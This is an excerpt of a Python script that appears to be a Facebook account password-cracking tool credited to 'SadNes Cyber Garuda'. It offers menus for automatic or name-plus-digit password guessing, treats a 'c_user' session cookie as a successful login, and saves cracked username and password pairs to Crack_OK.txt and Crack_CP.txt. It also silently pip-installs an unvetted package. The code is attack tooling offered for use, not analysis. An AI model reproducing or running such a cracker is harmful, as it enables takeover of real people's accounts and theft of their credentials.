...
try:
    ...
    print('\n [√] Checking Tigerskat !...\n')
    os.system('pip install Tigerskat')

import requests, os, re, bs4, Tigerskat, platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
...
logo =                                          """   
 || Welcome To Script SadNes Cyber Garuda ||
       || Coded By : TigerSkat ||
       || Country : Indonesian ||
|| Bergabung Dalam Permainan Maka Permainan ||
     || Kecil Mereka Akan Selesai  ||
|| Whe Are Anonymous || Whe Are Logion ||
                                                            \x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m Tigerskat
\033[1;31m\033[1;37m Facebook\x1b[1;97m :  \033[1;37mLa Andre Jhi
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m SadNesCyberGaruda
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[Crack] {loop}|{len(self.id)} [OK][{len(ok)}] [CP][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Crack-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Crack_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [Crack-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('Crack_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        print('[1] Crack Password Otomatis ')
        print('[2] Crack dengan Nama Digit Pass')
        chi = input('\n [?] Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
            ...
            print('\033[1;37m Cracking Dimulai...')
            print(47*"-")
            ...
            os.system("clear")
            print(logo)
            print("\033[1;37m\rMasukkan Nama Digits\033[1;37m\n")
            p1 = input('  Name + 1 : ')
            p2 = input('  Name + 2 : ')
            p3 = input('  Name + 3 : ')
            p4 = input('  Name + 4 : ')
...
def create_file():
    os.system('clear')
    print(logo)
    print('  [1] Buat File manual')
    print('  [2] Buat file auto')
